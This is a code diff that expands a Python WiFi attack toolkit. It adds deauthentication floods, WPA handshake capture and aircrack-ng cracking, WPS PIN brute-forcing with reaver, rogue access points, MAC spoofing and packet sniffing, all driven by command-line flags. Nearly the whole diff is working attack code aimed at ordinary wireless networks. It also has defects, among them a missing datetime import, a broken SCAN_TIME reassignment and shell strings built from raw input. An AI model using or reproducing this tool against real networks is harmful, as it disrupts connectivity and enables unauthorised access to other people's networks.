@@ -19,8 +19,12 @@ import sys
 import time
 import threading
 import signal
+import re
+import json
+import subprocess
+import argparse
 from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11Auth, Dot11AssoReq
 from colorama import Fore, Style, init
 
 # Initialize colorama
@@ -177,50 +181,361 @@ def print_networks(networks):
         if channel not in range(1, 15):
             print(f"{Fore.GREEN}{i + 1}. SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, Signal Strength: {strength} dBm{Style.RESET_ALL}")
 
+def spoof_mac(interface, new_mac):
+    """Spoof the MAC address of the attacking machine."""
+    if not re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", new_mac):
+        print(f"{Fore.RED}[!] Invalid MAC address format.{Style.RESET_ALL}")
+        return
+    print(f"{Fore.YELLOW}[*] Changing MAC address to {new_mac}...{Style.RESET_ALL}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo ifconfig {interface} hw ether {new_mac}")
+    os.system(f"sudo ifconfig {interface} up")
+
+def inject_packet(interface, packet):
+    """Inject a custom packet into the network."""
+    print(f"{Fore.YELLOW}[*] Injecting custom packet...{Style.RESET_ALL}")
+    try:
+        sendp(packet, iface=interface)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during packet injection: {e}{Style.RESET_ALL}")
+
+def capture_handshake(interface, bssid, output_file):
+    """Capture WPA handshake for offline cracking."""
+    print(f"{Fore.YELLOW}[*] Capturing WPA handshake for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --bssid {bssid} --write {output_file} --output-format pcap {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during handshake capture: {e}{Style.RESET_ALL}")
+
+def list_connected_clients(interface, bssid):
+    """List clients connected to a specific AP."""
+    print(f"{Fore.YELLOW}[*] Listing clients connected to BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --bssid {bssid} --write /tmp/clients --output-format csv {interface}")
+        with open("/tmp/clients-01.csv", "r") as f:
+            for line in f:
+                if "Station MAC" in line:
+                    continue
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error listing connected clients: {e}{Style.RESET_ALL}")
+
+def create_rogue_ap(interface, ssid, channel):
+    """Create a rogue access point."""
+    print(f"{Fore.YELLOW}[*] Creating rogue AP with SSID: {ssid} on channel {channel}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airbase-ng -e {ssid} -c {channel} {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error creating rogue AP: {e}{Style.RESET_ALL}")
+
+def crack_wps_pin(interface, bssid):
+    """Attempt to crack the WPS PIN of a vulnerable router."""
+    print(f"{Fore.YELLOW}[*] Attempting to crack WPS PIN for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo reaver -i {interface} -b {bssid} -vv")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error cracking WPS PIN: {e}{Style.RESET_ALL}")
+
+def packet_sniff(interface, filter_mac=None):
+    """Sniff packets on a specific interface."""
+    print(f"{Fore.YELLOW}[*] Starting packet sniffing on interface {interface}...{Style.RESET_ALL}")
+    try:
+        if filter_mac:
+            sniff(iface=interface, prn=lambda x: x.summary() if x.addr2 == filter_mac else None, store=False)
+        else:
+            sniff(iface=interface, prn=lambda x: x.summary(), store=False)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during packet sniffing: {e}{Style.RESET_ALL}")
+
+def network_stats(interface):
+    """Display real-time network statistics."""
+    print(f"{Fore.YELLOW}[*] Displaying network statistics for interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo ifconfig {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error displaying network statistics: {e}{Style.RESET_ALL}")
+
+def craft_packet():
+    """Craft a custom packet."""
+    print(f"{Fore.YELLOW}[*] Crafting a custom packet...{Style.RESET_ALL}")
+    try:
+        packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80)
+        print(f"{Fore.YELLOW}[*] Packet crafted: {packet.summary()}{Style.RESET_ALL}")
+        return packet
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error crafting packet: {e}{Style.RESET_ALL}")
+
+def automated_attack(interface, bssid):
+    """Run an automated attack script."""
+    print(f"{Fore.YELLOW}[*] Running automated attack on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        print(f"{Fore.YELLOW}[*] Starting deauthentication attack...{Style.RESET_ALL}")
+        deauth_attack(interface, bssid, continuous=True)
+        print(f"{Fore.YELLOW}[*] Capturing WPA handshake...{Style.RESET_ALL}")
+        capture_handshake(interface, bssid, "handshake")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during automated attack: {e}{Style.RESET_ALL}")
+
+def save_config(config, filename="config.json"):
+    """Save configuration to a file."""
+    print(f"{Fore.YELLOW}[*] Saving configuration to {filename}...{Style.RESET_ALL}")
+    try:
+        with open(filename, "w") as f:
+            json.dump(config, f)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error saving configuration: {e}{Style.RESET_ALL}")
+
+def load_config(filename="config.json"):
+    """Load configuration from a file."""
+    print(f"{Fore.YELLOW}[*] Loading configuration from {filename}...{Style.RESET_ALL}")
+    try:
+        with open(filename, "r") as f:
+            return json.load(f)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error loading configuration: {e}{Style.RESET_ALL}")
+        return {}
+
+def wifi_network_map(interface):
+    """Create a visual map of nearby WiFi networks."""
+    print(f"{Fore.YELLOW}[*] Creating WiFi network map for interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --write /tmp/network_map --output-format csv {interface}")
+        with open("/tmp/network_map-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error creating WiFi network map: {e}{Style.RESET_ALL}")
+
+def detect_client_isolation(interface, bssid):
+    """Detect if client isolation is enabled on a network."""
+    print(f"{Fore.YELLOW}[*] Detecting client isolation for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo aireplay-ng --test -a {bssid} {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error detecting client isolation: {e}{Style.RESET_ALL}")
+
+def discover_hidden_ssids(interface):
+    """Discover hidden SSIDs by analyzing probe requests and responses."""
+    print(f"{Fore.YELLOW}[*] Discovering hidden SSIDs on interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --hidden --write /tmp/hidden_ssids --output-format csv {interface}")
+        with open("/tmp/hidden_ssids-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error discovering hidden SSIDs: {e}{Style.RESET_ALL}")
+
+def time_based_attack(interface, bssid, start_time, duration):
+    """Schedule a deauthentication attack to run at a specific time."""
+    print(f"{Fore.YELLOW}[*] Scheduling deauthentication attack on BSSID: {bssid} to start at {start_time}...{Style.RESET_ALL}")
+    try:
+        start_time = datetime.strptime(start_time, "%Y-%m-%d %H:%M:%S")
+        while datetime.now() < start_time:
+            time.sleep(1)
+        print(f"{Fore.YELLOW}[*] Starting deauthentication attack...{Style.RESET_ALL}")
+        deauth_attack(interface, bssid, continuous=True)
+        time.sleep(duration)
+        print(f"{Fore.YELLOW}[*] Stopping deauthentication attack...{Style.RESET_ALL}")
+        running = False
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during time-based attack: {e}{Style.RESET_ALL}")
+
+def signal_strength_visualization(interface, bssid):
+    """Visualize signal strength over time for a specific network or client."""
+    print(f"{Fore.YELLOW}[*] Visualizing signal strength for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --bssid {bssid} --write /tmp/signal_strength --output-format csv {interface}")
+        with open("/tmp/signal_strength-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error visualizing signal strength: {e}{Style.RESET_ALL}")
+
+def generate_report(filename="report.html"):
+    """Generate a detailed report in HTML format."""
+    print(f"{Fore.YELLOW}[*] Generating report: {filename}...{Style.RESET_ALL}")
+    try:
+        with open(filename, "w") as f:
+            f.write("<html><body><h1>WiFi Toolkit Report</h1></body></html>")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error generating report: {e}{Style.RESET_ALL}")
+
+def integrate_aircrack(interface, bssid, wordlist):
+    """Integrate with aircrack-ng for WEP/WPA cracking."""
+    print(f"{Fore.YELLOW}[*] Running aircrack-ng on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo aircrack-ng -b {bssid} -w {wordlist} /tmp/handshake-01.cap")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error running aircrack-ng: {e}{Style.RESET_ALL}")
+
+def integrate_tshark(interface, filter):
+    """Integrate with tshark for advanced packet analysis."""
+    print(f"{Fore.YELLOW}[*] Running tshark on interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo tshark -i {interface} -f '{filter}'")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error running tshark: {e}{Style.RESET_ALL}")
+
+def interactive_mode(interface):
+    """Interactive mode for scanning and deauthentication."""
+    print(f"{Fore.YELLOW}[*] Entering interactive mode...{Style.RESET_ALL}")
+    while True:
+        print(f"\n{Fore.CYAN}Interactive Mode Menu:{Style.RESET_ALL}")
+        print("1. Scan Networks")
+        print("2. Exit")
+
+        try:
+            choice = int(input(f"{Fore.YELLOW}[*] Select an option (1-2): {Style.RESET_ALL}"))
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input. Please enter a number.{Style.RESET_ALL}")
+            continue
+
+        if choice == 1:
+            networks = wifi_scan(interface)
+            if not networks:
+                print(f"{Fore.RED}[!] No networks found.{Style.RESET_ALL}")
+                continue
+            print_networks(networks)
+
+            # After scanning, ask if the user wants to deauthenticate
+            try:
+                deauth_choice = input(f"{Fore.YELLOW}[*] Do you want to deauthenticate a network? (y/n): {Style.RESET_ALL}").lower()
+                if deauth_choice == 'y':
+                    try:
+                        network_choice = int(input(f"{Fore.YELLOW}[*] Select a network to attack (1-{len(networks)}): {Style.RESET_ALL}"))
+                        if network_choice < 1 or network_choice > len(networks):
+                            print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
+                            continue
+                        selected_network = networks[network_choice - 1]
+                        print(f"{Fore.YELLOW}[*] Selected network: SSID: {selected_network[0]}, BSSID: {selected_network[1]}, Channel: {selected_network[2]}{Style.RESET_ALL}")
+                        deauth_attack(interface, selected_network[1], continuous=True)
+                    except ValueError:
+                        print(f"{Fore.RED}[!] Invalid input.{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+
+        elif choice == 2:
+            print(f"{Fore.YELLOW}[*] Exiting interactive mode...{Style.RESET_ALL}")
+            break
+
+        else:
+            print(f"{Fore.RED}[!] Invalid choice. Please select a valid option.{Style.RESET_ALL}")
+
 def main():
     global interface
     print(BANNER)  # Display banner
 
-    if len(sys.argv) != 2:
-        print(f"{Fore.RED}Usage: {sys.argv[0]} <wireless_interface>{Style.RESET_ALL}")
-        sys.exit(1)
+    # Argument parsing
+    parser = argparse.ArgumentParser(description="WiFi Deauthentication Toolkit")
+    parser.add_argument("interface", help="Wireless interface to use (e.g., wlan0)")
+    parser.add_argument("-i", "--interactive", action="store_true", help="Enter interactive mode")
+    parser.add_argument("--spoof-mac", type=str, help="Spoof the MAC address of the wireless interface")
+    parser.add_argument("--inject-packet", action="store_true", help="Inject a custom packet into the network")
+    parser.add_argument("--capture-handshake", type=str, help="Capture WPA handshake for offline cracking (provide BSSID)")
+    parser.add_argument("--list-clients", type=str, help="List clients connected to a specific AP (provide BSSID)")
+    parser.add_argument("--create-rogue-ap", nargs=2, metavar=("SSID", "CHANNEL"), help="Create a rogue access point")
+    parser.add_argument("--crack-wps", type=str, help="Attempt to crack the WPS PIN of a vulnerable router (provide BSSID)")
+    parser.add_argument("--packet-sniff", type=str, help="Sniff packets on a specific interface (optional: provide MAC address to filter)")
+    parser.add_argument("--network-stats", action="store_true", help="Display real-time network statistics")
+    parser.add_argument("--craft-packet", action="store_true", help="Craft a custom packet")
+    parser.add_argument("--automated-attack", type=str, help="Run an automated attack script (provide BSSID)")
+    parser.add_argument("--save-config", type=str, help="Save the current configuration to a file")
+    parser.add_argument("--load-config", type=str, help="Load a configuration from a file")
+    parser.add_argument("--wifi-map", action="store_true", help="Create a visual map of nearby WiFi networks")
+    parser.add_argument("--detect-isolation", type=str, help="Detect if client isolation is enabled on a network (provide BSSID)")
+    parser.add_argument("--discover-hidden", action="store_true", help="Discover hidden SSIDs by analyzing probe requests and responses")
+    parser.add_argument("--time-based-attack", nargs=3, metavar=("BSSID", "START_TIME", "DURATION"), help="Schedule a deauthentication attack to run at a specific time")
+    parser.add_argument("--signal-strength", type=str, help="Visualize signal strength over time for a specific network or client (provide BSSID)")
+    parser.add_argument("--generate-report", type=str, help="Generate a detailed report in HTML format")
+    parser.add_argument("--aircrack", nargs=2, metavar=("BSSID", "WORDLIST"), help="Integrate with aircrack-ng for WEP/WPA cracking")
+    parser.add_argument("--tshark", type=str, help="Integrate with tshark for advanced packet analysis (provide filter)")
+    parser.add_argument("--help-menu", action="store_true", help="Display help information")
+
+    args = parser.parse_args()
 
     # Check for root privileges
     check_root()
 
-    interface = sys.argv[1]
+    interface = args.interface
     set_monitor_mode(interface)
 
     # Register the signal handler for Ctrl+C
     signal.signal(signal.SIGINT, signal_handler)
 
-    # Scan for WiFi networks
-    networks = wifi_scan(interface)
-    if not networks:
-        print(f"{Fore.RED}[!] No networks found.{Style.RESET_ALL}")
-        reset_interface(interface)
-        sys.exit(1)
+    if args.interactive:
+        interactive_mode(interface)
+    else:
+        # Normal mode: Handle other command-line arguments
+        if args.spoof_mac:
+            spoof_mac(interface, args.spoof_mac)
 
-    # Print networks, separating 2.4 GHz and 5 GHz
-    print_networks(networks)
+        if args.inject_packet:
+            packet = craft_packet()
+            if packet:
+                inject_packet(interface, packet)
 
-    # Select a network to attack
-    try:
-        choice = int(input(f"\n{Fore.YELLOW}[*] Select a network to attack (1-{len(networks)}): {Style.RESET_ALL}"))
-        if choice < 1 or choice > len(networks):
-            print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
-            reset_interface(interface)
-            sys.exit(1)
-    except ValueError:
-        print(f"{Fore.RED}[!] Invalid input.{Style.RESET_ALL}")
-        reset_interface(interface)
-        sys.exit(1)
+        if args.capture_handshake:
+            capture_handshake(interface, args.capture_handshake, "handshake")
 
-    selected_network = networks[choice - 1]
-    print(f"\n{Fore.YELLOW}[*] Selected network: SSID: {selected_network[0]}, BSSID: {selected_network[1]}, Channel: {selected_network[2]}{Style.RESET_ALL}")
+        if args.list_clients:
+            list_connected_clients(interface, args.list_clients)
 
-    # Start deauthentication attack
-    deauth_attack(interface, selected_network[1], continuous=True)
+        if args.create_rogue_ap:
+            create_rogue_ap(interface, args.create_rogue_ap[0], int(args.create_rogue_ap[1]))
+
+        if args.crack_wps:
+            crack_wps_pin(interface, args.crack_wps)
+
+        if args.packet_sniff:
+            packet_sniff(interface, args.packet_sniff)
+
+        if args.network_stats:
+            network_stats(interface)
+
+        if args.craft_packet:
+            packet = craft_packet()
+            if packet:
+                inject_packet(interface, packet)
+
+        if args.automated_attack:
+            automated_attack(interface, args.automated_attack)
+
+        if args.save_config:
+            config = {"interface": interface, "scan_time": SCAN_TIME}
+            save_config(config, args.save_config)
+
+        if args.load_config:
+            config = load_config(args.load_config)
+            if config:
+                interface = config.get("interface", interface)
+                SCAN_TIME = config.get("scan_time", SCAN_TIME)
+
+        if args.wifi_map:
+            wifi_network_map(interface)
+
+        if args.detect_isolation:
+            detect_client_isolation(interface, args.detect_isolation)
+
+        if args.discover_hidden:
+            discover_hidden_ssids(interface)
+
+        if args.time_based_attack:
+            time_based_attack(interface, args.time_based_attack[0], args.time_based_attack[1], int(args.time_based_attack[2]))
+
+        if args.signal_strength:
+            signal_strength_visualization(interface, args.signal_strength)
+
+        if args.generate_report:
+            generate_report(args.generate_report)
+
+        if args.aircrack:
+            integrate_aircrack(interface, args.aircrack[0], args.aircrack[1])
+
+        if args.tshark:
+            integrate_tshark(interface, args.tshark)
+
+        if args.help_menu:
+            help()
 
     # Reset the interface to managed mode
     reset_interface(interface)
